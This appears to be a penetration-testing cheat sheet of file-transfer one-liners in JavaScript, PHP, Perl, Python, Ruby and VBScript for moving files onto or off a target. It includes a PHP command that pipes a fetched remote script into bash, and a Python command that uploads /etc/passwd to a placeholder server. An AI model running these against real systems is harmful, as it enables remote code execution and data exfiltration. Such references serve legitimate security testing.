JavaScript

Usage

Download

Create wget.js file with the following code :

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

Use cscript.exe :

cscript.exe /nologo wget.js <targetFileURL> <outputFileName>

PHP

Usage

Download

With File_get_contents() :

php -r '$file = file_get_contents("<targetFileURL>"); file_put_contents("<outputFileName>",$file);'

With Fopen() :

php -r 'const BUFFER = 1024; $fremote = 
fopen("<targetFileURL>", "rb"); $flocal = fopen("<outputFileName>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

Pipe to bash :

php -r '$lines = @file("<targetFileURL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

Perl

Usage

Download
perl -e 'use LWP::Simple; getstore("<targetFileURL>", "<outputFileName>");'

Python

Usage

Download

Python 2 :

python2.7 -c 'import urllib;urllib.urlretrieve ("<targetFileURL>", "<outputFileName>")'

Python 3 :

python3 -c 'import urllib.request;urllib.request.urlretrieve("<targetFileURL>", "<outputFileName>")'
Upload

Start web server (Uploadserver module) :

python3 -m uploadserver

Upload a file:

python3 -c 'import requests;requests.post("http://<serverIP>:8000/upload",files={"files":open("/etc/passwd","rb")})'

Ruby

Usage

Download
ruby -e 'require "net/http"; File.write("<outputFileName>", Net::HTTP.get(URI.parse("<targetFileURL>")))'

VBScript

Usage

Download

Create wget.vbs file with the following code :

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

Use cscript.exe :

cscript.exe /nologo wget.vbs <targetFileURL> <outputFileName>
